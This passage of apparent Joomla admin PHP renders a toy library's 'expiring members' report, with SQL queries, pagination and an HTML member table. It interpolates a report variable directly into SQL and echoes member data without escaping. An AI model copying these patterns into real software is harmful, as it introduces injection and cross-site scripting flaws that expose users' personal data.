<BR><center><input type=submit name=submit value='Generate report'></center><BR>
</form>
<?php
		$check_member_expiring_query = $db->getQuery(true);
		$check_member_expiring_query
		->select('SQL_CALC_FOUND_ROWS *')
		->from($db->quoteName('#__toydatabase_membership'))
		->where($db->quoteName('active') . ' = "1"', 'AND');
		if($in_report_past_members) {
			$check_member_expiring_query->where("(".$db->quoteName('renewaldate') . "> NOW() + INTERVAL $report_expiring_days DAY OR renewaldate < NOW())");
		} else {
			$check_member_expiring_query->where($db->quoteName('renewaldate') . "> NOW() + INTERVAL $report_expiring_days DAY");
		};
		
		$app = JFactory::getApplication();
		$limit = $app->getUserStateFromRequest("$option.limit", 'limit', 25, 'int');
		$limitstart = JFactory::getApplication()->input->get('limitstart', 0, 'INT');
		
		$db->setQuery($check_member_expiring_query,$limitstart, $limit);
		$row = $db->loadAssocList('id');
		if(!empty($row)){
			$db->setQuery('SELECT FOUND_ROWS();');
			$num_rows=$db->loadResult();
			jimport('joomla.html.pagination');
			$pager=new JPagination($num_rows, $limitstart, $limit);
		};
		echo "<BR>Users expiring: $num_rows<BR>\n";
?>
				<!-- Print/PDF button -->
		<table width=100% border=0 cellpadding=0 cellspacing=0>
		<tr align=right><td align=right><input type=button name='printpage' id='printpage' value='Print Members' onclick='window.open("<?=JURI::root()?>/administrator/components/com_toydatabase/pdf_output.php?disp=expiring_members&report_expiring_days=<?=$in_report_expiring_days?>&report_past_members=<?=$in_report_past_members?>");'></td></tr>
		</table>
		<BR>
		<!-- end print button -->
		<table width=85% border=1 cellpadding=0 cellspacing=0 class="hoverTable">
						<tr><td width=5%><B>Member joomla ID</B></td>
						<td width=10%><B>Member URN</B></td>
						<td width=20%><B>Member Name</B></td>
						<td width=20%><B>Company</B></td>
						<td width=10%><B>Postcode</B></td>
						<td width=10%><B>Member Category</B></td>
						<td width=10%><B>Join Date</B></td>
						<td width=10%><B>Renewal Date</B></td>
						<td width=5%><B>Status</B></td>
						</tr>
						<?php
						if (!empty($row)) {
							// print_r($row);
							foreach ($row as $row_key=>$row_value) {
								// convert memb_category
								// link to joomlaid
								// joindate to human date
								// renewaldate to human date
								
								$check_member_query = $db->getQuery(true);
								$check_member_query
								->select('*')
								->from($db->quoteName('#__toydatabase_membershiplink'))
								->where($db->quoteName('membershipid') . ' = '. $row_value["id"]);
								$db->setQuery((string) $check_member_query);
								$db->execute();
								$membership_row = $db->loadAssoc();
								
								// get member category
								$get_memb_cat = $db->getQuery(true);
								$get_memb_cat
								->select('*')
								->from($db->quoteName('#__toydatabase_membershiptypes'))
								->where($db->quoteName('id') . ' = '. $row_value["memb_category"]);
								$db->setQuery((string) $get_memb_cat);
								$db->execute();
								$memb_cat_data = $db->loadAssoc();
								
								if ($row_value["joindate"] != "0000-00-00 00:00:00") {
									$entry_joindate=JFactory::getDate($row_value["joindate"]);
									$entry_joindate_out=JHtml::_('date', $entry_joindate, 'd/m/Y');
								} else {
									$entry_joindate_out="N/A";
								};
								
								if ($row_value["renewaldate"] != "0000-00-00 00:00:00") {
									$entry_renewaldate=JFactory::getDate($row_value["renewaldate"]);
									$entry_renewaldate_out=JHtml::_('date', $entry_renewaldate, 'd/m/Y');
								} else {
									$entry_renewaldate_out="N/A";
								};
								if ($row_value["active"] == "1") {$entry_active="Active";};
								if ($row_value["active"] == "0") {$entry_active="Pending";};
								if ($row_value["active"] == "10") {$entry_active="Suspended";};
								if ($row_value["active"] == "99") {$entry_active="Deleted";};
								
								echo "<tr onclick='self.location=\"".JURI::getInstance()->toString()."&tab=member&page=members&member_act=1&ddid=$row_key\"'>";
								echo "<td>".$row_value["joomla_userid"]."</td>";
								echo "<td>".$row_value["urn"]."</td>";
								echo "<td>".$row_value["name"]."</td>";
								echo "<td>".$row_value["companyname"]."</td>";
								echo "<td>".$row_value["postcode"]."</td>";
								echo "<td>".$memb_cat_data["type"]."</td>";
								echo "<td>".$entry_joindate_out."</td>";
								echo "<td>".$entry_renewaldate_out."</td>";
								echo "<td>".$entry_active."</td>";
								echo "</tr>\n";
							};
?>
</table><form name="adminForm" id="adminForm">
		<input type=hidden name='option' value='com_toydatabase'>
		<input type=hidden name='page' value='reports'>
		<input type=hidden name='report' value='expiring'>
		<input type=hidden name='report_past_members' value='<?=$in_report_past_members?>'>
<?php
						echo $pager->getListFooter();
						echo "Number of members to display per page: ".$pager->getLimitBox()."<BR>\n";
						echo "</form>";
						} else {
							// no rows or toys in database found
							echo "<tr><td colspan=9 align=center><B>Sorry - No members found</B></td></tr>\n";
							echo "</table>\n";
						};
							
		break;
	default:
		echo "Please select a report type to continue<BR>";
		break;
};
?>
<BR><center><input type=submit name=submit value='Generate report'></center><BR>
</form>
